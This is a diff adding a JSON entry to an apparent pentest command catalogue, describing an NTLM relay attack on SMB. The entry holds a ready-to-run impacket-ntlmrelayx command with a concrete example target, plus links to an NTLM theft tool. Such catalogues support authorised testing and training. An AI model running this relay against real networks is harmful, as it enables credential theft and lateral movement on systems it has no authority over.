@@ -1,0 +1,33 @@
+{
+  "id": "ntlmrelayx-smb",
+  "name": "NTLM Relay to SMB",
+  "command": "impacket-ntlmrelayx -t smb://<ip> -dh -smb2support --enum-local-admins",
+  "description": "NTLM relay attack targeting SMB service",
+  "platform": "linux",
+  "requires": [
+    "no-creds"
+  ],
+  "protocols": [
+    "smb",
+    "ntlm"
+  ],
+  "tags": [
+    "impacket",
+    "ntlmrelay",
+    "relay",
+    "smb"
+  ],
+  "references": [
+    {
+      "title": "NTLM Theft Tool",
+      "url": "https://github.com/Greenwolf/ntlm_theft"
+    },
+    {
+      "title": "NTLM Relay Theory",
+      "url": "https://www.thehacker.recipes/ad/movement/ntlm/relay"
+    }
+  ],
+  "examples": [
+    "impacket-ntlmrelayx -t smb://192.168.1.100 -dh -smb2support --enum-local-admins"
+  ]
+}
